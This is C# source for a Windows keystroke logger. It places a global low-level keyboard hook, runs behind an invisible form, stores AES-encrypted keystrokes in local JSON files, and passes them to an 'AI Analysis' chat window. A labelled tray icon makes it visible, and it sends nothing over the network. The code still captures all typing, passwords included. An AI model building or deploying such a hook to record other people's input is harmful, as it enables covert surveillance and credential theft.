using System;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Text;
using System.Collections.Generic;
using System.IO;
using System.Diagnostics;
using System.Text.Json;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Linq;

namespace KeyloggerProject
{
    internal static class NativeMethods
    {
        [DllImport("user32.dll", SetLastError = true)]
        internal static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", SetLastError = true)]
        internal static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", SetLastError = true)]
        internal static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern IntPtr GetModuleHandle(string? lpModuleName);

        internal delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    }

    public class KeystrokeLogger : Form
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int VK_CONTROL = 162;
        private const int VK_SHIFT = 160;
        private const int VK_L = 76;
        private const int VK_K = 75;
        private IntPtr _hookID = IntPtr.Zero;
        private readonly NativeMethods.LowLevelKeyboardProc _proc;
        private readonly HashSet<int> _pressedKeys = new();
        private bool _recording;
        private NotifyIcon? _trayIcon;
        private readonly StringBuilder _buffer = new();
        private readonly System.Windows.Forms.Timer _writeTimer;
        private readonly object _lockObject = new();
        private readonly string _keyPath;
        private readonly string _keystrokesPath;
        private readonly string _conversationsPath;
        private byte[]? _encryptionKey;

        public KeystrokeLogger()
        {
            try
            {
                var config = Configuration.Instance;
                
                // Initialize paths
                _keyPath = config.Files?.Key ?? "logger.key";
                _keystrokesPath = config.Files?.Keystrokes ?? "keystrokes.json";
                _conversationsPath = config.Files?.Conversations ?? "conversations.json";

                // Initialize keyboard hook
                _proc = HookCallback;
                _hookID = SetHook(_proc);

                // Set buffer size
                _buffer.EnsureCapacity(config.Buffer?.Size ?? 500);

                // Initialize timer
                _writeTimer = new System.Windows.Forms.Timer
                {
                    Interval = config.Buffer?.WriteInterval ?? 5000
                };
                _writeTimer.Tick += (s, e) => WriteBuffer();
                _writeTimer.Start();

                // Initialize UI
                InitializeTrayIcon();
                InitializeForm();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Initialization error: {ex.Message}");
                Environment.Exit(1);
            }
        }

        private void InitializeForm()
        {
            ShowInTaskbar = false;
            Opacity = 0;
            FormBorderStyle = FormBorderStyle.None;
            Size = new Size(1, 1);
        }

        private IntPtr SetHook(NativeMethods.LowLevelKeyboardProc proc)
        {
            using var curProcess = Process.GetCurrentProcess();
            using var curModule = curProcess.MainModule;
            return NativeMethods.SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                NativeMethods.GetModuleHandle(curModule?.ModuleName), 0);
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode < 0) return NativeMethods.CallNextHookEx(_hookID, nCode, wParam, lParam);

            try
            {
                var vkCode = Marshal.ReadInt32(lParam);

                if (wParam == (IntPtr)WM_KEYDOWN)
                {
                    lock (_pressedKeys)
                    {
                        _pressedKeys.Add(vkCode);
                    }

                    if (IsHotkeyPressed(VK_CONTROL, VK_SHIFT, VK_L))
                    {
                        BeginInvoke(ToggleRecording);
                        _pressedKeys.Clear();
                        return (IntPtr)1;
                    }

                    if (IsHotkeyPressed(VK_CONTROL, VK_SHIFT, VK_K))
                    {
                        BeginInvoke(HandleAIAnalysis);
                        _pressedKeys.Clear();
                        return (IntPtr)1;
                    }

                    if (_recording)
                    {
                        ProcessKeypress(vkCode);
                    }
                }
                else if (wParam == (IntPtr)WM_KEYUP)
                {
                    lock (_pressedKeys)
                    {
                        _pressedKeys.Remove(vkCode);
                    }
                }
            }
            catch (Exception)
            {
                // Silent fail for hook callback
            }

            return NativeMethods.CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private bool IsHotkeyPressed(params int[] keys)
        {
            lock (_pressedKeys)
            {
                return keys.All(k => _pressedKeys.Contains(k));
            }
        }

        private void ProcessKeypress(int vkCode)
        {
            lock (_lockObject)
            {
                if (vkCode >= 32 && vkCode <= 126)
                {
                    _buffer.Append((char)vkCode);
                }
                else if (vkCode == 13)
                {
                    _buffer.Append(Environment.NewLine);
                }

                if (_buffer.Length >= (Configuration.Instance.Buffer?.Size ?? 500))
                {
                    WriteBuffer();
                }
            }
        }

        private void WriteBuffer()
        {
            lock (_lockObject)
            {
                if (_buffer.Length == 0) return;

                try
                {
                    var text = _buffer.ToString();
                    var encrypted = EncryptText(text);
                    if (encrypted == null) return;

                    var session = new
                    {
                        Timestamp = DateTime.UtcNow,
                        Text = encrypted,
                        CharCount = text.Length
                    };

                    SaveSession(session);
                    _buffer.Clear();
                }
                catch
                {
                    // Silent fail
                }
            }
        }

        private void SaveSession(object session)
        {
            try
            {
                var sessions = LoadSessions();
                sessions.Add(session);

                File.WriteAllText(_keystrokesPath,
                    JsonSerializer.Serialize(sessions, new JsonSerializerOptions
                    {
                        WriteIndented = true
                    }));
            }
            catch
            {
                // Silent fail
            }
        }

        private List<object> LoadSessions()
        {
            if (!File.Exists(_keystrokesPath)) return new List<object>();

            try
            {
                var json = File.ReadAllText(_keystrokesPath);
                return string.IsNullOrEmpty(json) ?
                    new List<object>() :
                    JsonSerializer.Deserialize<List<object>>(json) ?? new List<object>();
            }
            catch
            {
                return new List<object>();
            }
        }

        private string? EncryptText(string text)
        {
            try
            {
                EnsureEncryptionKey();
                if (_encryptionKey == null) return null;

                text = new string(text.Where(c => 
                    char.IsControl(c) || 
                    char.IsLetterOrDigit(c) || 
                    char.IsPunctuation(c) || 
                    char.IsWhiteSpace(c)).ToArray());

                using var aes = Aes.Create();
                aes.KeySize = 256;
                aes.Key = _encryptionKey;
                aes.GenerateIV();

                using var msEncrypt = new MemoryStream();
                msEncrypt.Write(aes.IV, 0, aes.IV.Length);

                using (var encryptor = aes.CreateEncryptor())
                using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                using (var writer = new StreamWriter(csEncrypt))
                {
                    writer.Write(text);
                }

                return Convert.ToBase64String(msEncrypt.ToArray());
            }
            catch
            {
                return null;
            }
        }

        private string? DecryptText(string encryptedText)
        {
            try
            {
                EnsureEncryptionKey();
                if (_encryptionKey == null) return null;

                var cipherText = Convert.FromBase64String(encryptedText);
                using var aes = Aes.Create();
                aes.KeySize = 256;
                aes.Key = _encryptionKey;

                byte[] iv = new byte[16];
                Array.Copy(cipherText, 0, iv, 0, 16);
                aes.IV = iv;

                using var msDecrypt = new MemoryStream();
                using (var decryptor = aes.CreateDecryptor())
                using (var csDecrypt = new CryptoStream(
                    new MemoryStream(cipherText, 16, cipherText.Length - 16),
                    decryptor,
                    CryptoStreamMode.Read))
                {
                    csDecrypt.CopyTo(msDecrypt);
                }

                return Encoding.UTF8.GetString(msDecrypt.ToArray());
            }
            catch
            {
                return null;
            }
        }

        private void EnsureEncryptionKey()
        {
            if (_encryptionKey != null) return;

            try
            {
                if (File.Exists(_keyPath))
                {
                    _encryptionKey = File.ReadAllBytes(_keyPath);
                    if (_encryptionKey.Length == 32) return;
                }

                using var aes = Aes.Create();
                aes.KeySize = 256;
                aes.GenerateKey();
                _encryptionKey = aes.Key;
                File.WriteAllBytes(_keyPath, _encryptionKey);
            }
            catch
            {
                _encryptionKey = null;
            }
        }

        private void InitializeTrayIcon()
        {
            _trayIcon = new NotifyIcon
            {
                Icon = CreateColorIcon(Color.Red),
                Visible = true,
                Text = "Keylogger (OFF)"
            };

            var menu = new ContextMenuStrip();
            menu.Items.Add("Toggle Recording (Ctrl+Shift+L)", null, (s, e) => ToggleRecording());
            menu.Items.Add("AI Analysis (Ctrl+Shift+K)", null, (s, e) => HandleAIAnalysis());
            menu.Items.Add(new ToolStripSeparator());
            menu.Items.Add("Exit", null, (s, e) => Application.Exit());
            
            _trayIcon.ContextMenuStrip = menu;
            _trayIcon.MouseClick += (s, e) => 
            { 
                if (e.Button == MouseButtons.Left) ToggleRecording(); 
            };
        }

        private Icon CreateColorIcon(Color color)
        {
            using var bmp = new Bitmap(16, 16);
            using var g = Graphics.FromImage(bmp);
            g.Clear(Color.Transparent);
            using var brush = new SolidBrush(color);
            g.FillEllipse(brush, 2, 2, 12, 12);
            using var pen = new Pen(Color.White, 1);
            g.DrawEllipse(pen, 2, 2, 12, 12);
            return Icon.FromHandle(bmp.GetHicon());
        }

        private void ToggleRecording()
        {
            _recording = !_recording;
            if (_trayIcon != null)
            {
                _trayIcon.Icon = CreateColorIcon(_recording ? Color.Green : Color.Red);
                _trayIcon.Text = $"Keylogger ({(_recording ? "ON" : "OFF")})";
                _trayIcon.ShowBalloonTip(2000, "Keylogger",
                    _recording ? "Recording Started" : "Recording Stopped",
                    ToolTipIcon.Info);
            }
        }

        private string GetRecentKeystrokes()
        {
            try
            {
                if (!File.Exists(_keystrokesPath)) return string.Empty;

                var jsonText = File.ReadAllText(_keystrokesPath);
                var sessions = JsonSerializer.Deserialize<List<JsonElement>>(jsonText);
                if (sessions == null) return string.Empty;

                var decryptedTexts = new List<string>();

                foreach (var session in sessions.AsEnumerable().Reverse())
                {
                    string? encryptedText = session.GetProperty("Text").GetString();
                    if (encryptedText != null)
                    {
                        var decrypted = DecryptText(encryptedText);
                        if (decrypted != null)
                        {
                            decryptedTexts.Add(decrypted);
                        }
                    }
                }

                return string.Join(" ", decryptedTexts);
            }
            catch
            {
                return string.Empty;
            }
        }

        private void HandleAIAnalysis()
        {
            string keystrokes = GetRecentKeystrokes();
            var chatWindow = new ChatWindow(keystrokes, this);
            chatWindow.ShowDialog();
        }

        public void SaveConversation(ConversationSession conversation)
        {
            try
            {
                var sessions = LoadConversations();
                sessions.Add(conversation);

                File.WriteAllText(_conversationsPath,
                    JsonSerializer.Serialize(sessions, new JsonSerializerOptions
                    {
                        WriteIndented = true
                    }));
            }
            catch
            {
                // Silent fail
            }
        }

        private List<ConversationSession> LoadConversations()
        {
            if (!File.Exists(_conversationsPath)) return new List<ConversationSession>();

            try
            {
                var json = File.ReadAllText(_conversationsPath);
                return string.IsNullOrEmpty(json) ?
                    new List<ConversationSession>() :
                    JsonSerializer.Deserialize<List<ConversationSession>>(json) ?? new List<ConversationSession>();
            }
            catch
            {
                return new List<ConversationSession>();
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            WriteBuffer();
            if (_hookID != IntPtr.Zero) NativeMethods.UnhookWindowsHookEx(_hookID);
            _writeTimer.Stop();
            if (_trayIcon != null) _trayIcon.Visible = false;
            base.OnFormClosing(e);
        }

        [STAThread]
        static void Main()
        {
            Application.SetHighDpiMode(HighDpiMode.SystemAware);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new KeystrokeLogger());
        }
    }
}